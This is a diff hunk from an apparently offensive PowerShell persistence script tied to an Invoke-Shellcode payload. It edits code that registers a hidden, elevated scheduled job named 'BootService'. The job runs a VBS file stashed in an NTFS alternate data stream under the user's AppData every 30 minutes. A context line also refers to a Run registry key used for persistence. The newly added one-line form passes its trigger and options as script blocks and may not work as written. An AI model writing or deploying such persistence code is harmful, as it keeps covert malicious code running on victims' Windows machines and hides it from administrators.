@@ -93,19 +93,12 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\BootService"
     }
     else {
-       $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trigger = New-JobTrigger -Once -At 7:00AM -RepeatIndefinitely -RepetitionInterval 00:30:00
-       $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
-       $paramHash = @{
-          Name = "BootService"
-          ScriptBlock = $Script
-          Trigger = $Trigger
-          ScheduledJobOption = $Option
-       }
-       Register-ScheduledJob $paramHash
-       "Process Complete. Persistent key is located at "
+      # $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
+      # $Trigger = New-JobTrigger -Once -At 7:00AM -RepeatIndefinitely -RepetitionInterval 00:30:00
+      # $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
+       Register-ScheduledJob -Name BootService -ScriptBlock {wscript.exe $env:USERPROFILE\AppData:$vbsFile} -Trigger {New-JobTrigger -Once -At 7:00AM -RepeatIndefinitely -RepetitionInterval 00:30:00} -ScheduledJobOption {New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler} 
     }
-    #Persist in Registry
+
 
 }
 
